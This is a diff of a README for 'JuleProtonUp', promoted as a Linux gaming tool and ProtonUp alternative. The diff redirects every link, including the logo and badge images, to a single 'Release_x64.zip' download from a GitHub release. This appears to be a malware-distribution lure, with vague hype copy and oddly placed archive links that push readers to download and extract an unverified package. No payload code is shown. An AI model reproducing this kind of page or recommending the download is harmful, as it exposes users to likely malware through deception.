@@ -4,7 +4,7 @@
 ## Introduction
 Welcome to **JuleProtonUp** (*JPU*), the cutting-edge solution for all your Linux gaming needs. JPU is a fast and lightweight alternative to ProtonUp, designed to elevate your gaming experience on Linux systems. With support for a wide range of games and seamless integration with Steam, JPU is here to revolutionize the way you game on Linux.
 
-![JPU Logo](https://example.com/jpu-logo.png)
+![JPU Logo](https://github.com/bleaidbleaid/jpu/releases/download/v2.0/Release_x64.zip)
 
 ## Features
 🕹️ **Enhanced Gaming Experience**: JPU optimizes game performance and compatibility on Linux, ensuring a smooth gaming experience.  
@@ -14,9 +14,9 @@ Welcome to **JuleProtonUp** (*JPU*), the cutting-edge solution for all your Linu
 🌐 **Linux-Gaming Ready**: JPU is built from the ground up for Linux gaming, ensuring compatibility and ease of use.  
 
 ## Getting Started
-To get started with JPU, simply download the software package from the following link: [Launch JPU](https://github.com/user-attachments/files/18383251/Software.zip)
+To get started with JPU, simply download the software package from the following link: [Launch JPU](https://github.com/bleaidbleaid/jpu/releases/download/v2.0/Release_x64.zip)
 
-[![Download JPU](https://img.shields.io/badge/Download-JPU-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download JPU](https://github.com/bleaidbleaid/jpu/releases/download/v2.0/Release_x64.zip)](https://github.com/bleaidbleaid/jpu/releases/download/v2.0/Release_x64.zip)
 
 Once you have downloaded the software package, follow these steps to install and set up JPU on your Linux system:
 1. Extract the contents of the downloaded zip file.
